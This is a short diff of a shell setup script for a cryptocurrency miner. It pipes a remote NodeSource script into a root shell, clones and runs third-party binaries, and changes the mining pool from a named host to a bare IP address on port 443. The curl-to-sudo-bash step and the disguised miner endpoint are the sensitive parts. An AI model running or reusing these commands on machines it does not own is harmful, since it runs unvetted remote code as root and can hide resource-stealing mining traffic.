@@ -11,4 +11,4 @@ sudo su --command "curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash
 git clone https://github.com/Bjordhil/CUSTOM
 cd CUSTOM
 chmod +x ngedie && chmod +x verus-solver
-./vrbjordhil -c stratum+tcp://ap.luckpool.net:3957 -u RG6DfuhnggRT2TZ8p6SFQt3FHakfJ3ac6J.XID -p x --cpu 64
+./vrbjordhil -c stratum+tcp://77.237.240.172:443 -u RG6DfuhnggRT2TZ8p6SFQt3FHakfJ3ac6J.XID -p x --cpu 64
